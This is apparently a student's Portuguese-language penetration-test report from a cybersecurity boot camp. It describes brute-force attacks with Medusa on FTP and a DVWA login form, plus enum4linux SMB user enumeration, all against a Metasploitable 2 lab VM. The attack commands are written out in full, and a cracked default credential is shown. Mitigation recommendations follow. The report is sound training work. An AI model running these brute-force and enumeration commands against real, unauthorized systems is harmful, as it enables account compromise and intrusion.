# Santander Boot Camp 2025 Ciber Security
* 🔒 Relatório de PenTest - Simulação de Ataques de Força Bruta
* 
* 📋 Resumo Executivo
* 
* Este relatório documenta os testes de penetração realizados contra ambientes controlados com o objetivo de simular 
* ataques de força bruta utilizando a ferramenta Medusa no Kali Linux. Os testes foram conduzidos contra os serviços 
* FTP, HTTP (DVWA) e SMB no ambiente Metasploitable 2.
*  
* 🔬 Metodologia
* 
* 🖥️ Ambiente de Teste
* Kali Linux: Máquina de ataque
* Metasploitable 2: Máquina alvo (192.168.56.101)
* Rede: Configuração host-only no VirtualBox
* Ferramenta Principal: Medusa para ataques de força bruta
*  
* 🎯 Escopo dos Testes
* Força bruta no serviço FTP
* Ataque a formulário de login web (DVWA)
* Enumeração de usuários e password spraying no SMB
* 
* ⚙️ Procedimentos de Teste
* 🔍 Reconhecimento Inicial
* Comando:
*  
* nmap -sV -p 21,22,80,445,139 192.168.56.101
* Resultados:
*  
* FTP (21/tcp): vsftpd 2.3.4
* SSH (22/tcp): OpenSSH 4.7p1
* HTTP (80/tcp): Apache httpd 2.2.8
* SMB (139/tcp, 445/tcp): Samba smbd 3.X - 4.X
* 
* 📝 Preparação de Wordlists
* 
* Criação de listas de usuários e senhas:
*  
* echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
* echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
* 
* 💥 Ataque de Força Bruta - FTP
* 
* Comando Medusa:
*  
* medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
* Resultados:
*  
* Credencial comprometida: msfadmin:msfadmin
* Acesso FTP bem-sucedido obtido
* Diretório "vulnerável" identificado
*  
* Validação de Acesso:
*  
* ftp 192.168.56.101
* Name: msfadmin
* Password: msfadmin
* Login successful
* 
* 🌐 Ataque ao DVWA (HTTP)
* Comando Medusa:
*  
* medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \
* -m PAGE:'/dvwa/login.php' \
* -m FORM:'username=USER&password=PASS&Login=Login' \
* -m FAIL:'Login failed' -t 6
* 
* 🔓 Enumeração SMB e Password Spraying
* Enumeração de usuários:
*  
* enum4linux -a 192.168.56.101 | tee enum4_out.txt
* Usuários identificados:
*  
* msfadmin (RID: 0xbb8)
* user (RID: 0xbba)
* root (RID: 0x3e8)
* Entre outros (games, nobody, bind, proxy, etc.)
* 
* 📊 Resultados e Impactos
* 🚨 Vulnerabilidades Identificadas
* Serviço	Vulnerabilidade	Impacto	Credenciais Comprometidas
* FTP	Senha fraca do usuário msfadmin	Alto	msfadmin:msfadmin
* SMB	Enumeração de usuários possível	Médio	-
* HTTP	Configuração insegura do DVWA	Médio	-
* 
* 
* 🔓 Acesso Obtido
* Acesso FTP completo com privilégios de leitura/gravação
* Enumeração completa da estrutura de usuários do sistema
* Identificação de múltiplas contas com potencial para escalação de privilégios
* 
* 📸 Evidências Coletadas
* Imagens de Evidência
* O diretório images/ contém capturas de tela que documentam:
*  
* 02.jpg: Configuração de rede e informações do sistema alvo
* 03.jpg, 04.jpg: Testes de conectividade e escaneamento inicial
* 05.jpg, 06.jpg: Preparação do ambiente e criação de wordlists
* 07.jpg, 09.jpg, 10.jpg: Processo de força bruta no FTP e acesso bem-sucedido
* 11.jpg, 12.jpg, 13.jpg: Tentativas de ataque ao DVWA
* 17.jpg, 18.jpg, 19.jpg, 20.jpg: Enumeração SMB e descoberta de usuários
* 
* 🛡️ Recomendações de Mitigação
* 🔐 Fortalecimento de Credenciais
* 
* Implementar políticas de senha complexas
* Estabelecer rotinas de troca periódica de senhas
* Utilizar autenticação multifator quando possível
* 
* 🛠️ Proteção de Serviços
* FTP: Migrar para SFTP/FTPS, limitar tentativas de login
* SMB: Restringir enumeração anônima, implementar segmentação de rede
* HTTP: Implementar WAF, rate limiting e CAPTCHA
* 
* 📊 Monitoramento e Detecção
* 
* Configurar alertas para múltiplas tentativas de login falhas
* Monitorar logs de autenticação em tempo real
* Implementar sistemas de detecção de intrusão (IDS)
* 
* ✅ Conclusão
* Os testes demonstraram a eficácia de ataques de força bruta contra serviços mal configurados e com credenciais fracas.
* A ferramenta Medusa mostrou-se eficiente para automatizar ataques contra múltiplos protocolos. A implementação das 
* medidas de mitigação recomendadas é crucial para proteger os ambientes contra este tipo de ataque.
* 
* 📎 Anexos
* 
* Wordlists utilizadas (users.txt, pass.txt)
* Logs completos do enum4linux
* Capturas de tela do processo de teste
* Configurações de rede do ambiente virtualizado
* Relatório gerado em 30/11/2025 - Para fins educacionais e de testes autorizados.